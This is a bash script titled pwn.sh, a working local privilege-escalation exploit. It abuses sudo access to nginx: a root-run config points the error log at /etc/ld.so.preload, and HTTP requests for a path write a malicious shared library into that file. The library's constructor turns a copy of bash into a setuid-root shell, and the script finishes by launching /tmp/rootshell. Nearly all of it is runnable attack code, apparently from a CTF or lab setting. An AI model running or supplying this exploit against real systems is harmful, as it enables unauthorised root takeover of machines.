#!/bin/bash
echo "~ pwn.sh ~"
echo "[+] First, we create our shell and library..."
cp /bin/bash /tmp/rootshell
cat << EOF > /tmp/pwn.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/pwn.so /tmp/pwn.c > /dev/null 2>&1
mv /tmp/pwn.so /tmp/pwn.so.bak
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx.conf
user root;
error_log /etc/ld.so.preload warn;
events {
        worker_connections 768;
}
http {
	server {
		listen 1332;
		root /;
		autoindex on;
	}
}
EOF
echo "[+] Run once..."
sudo /usr/sbin/nginx -c /tmp/nginx.conf 
echo "[+] Doing requests..."
curl "localhost:1332/tmp/pwn.so" > /dev/null 2>&1
curl "localhost:1332/tmp/pwn.so" > /dev/null 2>&1
echo "[+] Run twice..."
mv /tmp/pwn.so.bak /tmp/pwn.so
sudo -l > /dev/null 2>&1 
echo "[+] make sure to rm /etc/ld.so.preload and killall nginx a few times..."
ls -la /tmp/rootshell
/tmp/rootshell -p